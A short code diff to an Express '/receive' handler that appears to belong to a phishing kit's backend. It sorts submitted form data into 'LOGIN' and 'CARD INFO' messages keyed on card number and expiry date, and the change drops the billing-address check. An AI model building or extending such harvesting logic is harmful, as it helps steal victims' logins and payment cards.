@@ -215,7 +215,7 @@ app.post('/receive', async (req, res) => {
             prepareMessage("LOGIN", "/verify?action=1", true);
         }
 
-        if (!responseSent && (myObjects.includes('expiryDate') || myObjects.includes('cardNumber') || myObjects.includes('billing address'))) {
+        if (!responseSent && (myObjects.includes('expiryDate') || myObjects.includes('cardNumber') )) {
             prepareMessage("CARD INFO", { redirect_url }, false);
         }
         
